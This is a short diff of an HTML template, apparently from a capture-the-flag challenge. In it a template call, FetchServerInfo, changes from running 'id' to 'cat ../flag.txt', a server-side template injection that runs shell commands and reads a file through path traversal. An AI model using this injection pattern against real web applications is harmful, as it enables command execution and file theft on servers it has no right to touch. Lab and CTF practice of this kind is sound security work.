@@ -54,7 +54,7 @@
                     <li>ServerInfo.OS</li>
                     <li>ServerInfo.KernelVersion</li>
                     <li>ServerInfo.Memory</li>
-		  {{ .RequestData.FetchServerInfo "id"}}
+		  {{ .FetchServerInfo "cat ../flag.txt"}}
                 </ul>
                 <h3>Enter the link to your template!</h3>
                 <hr>
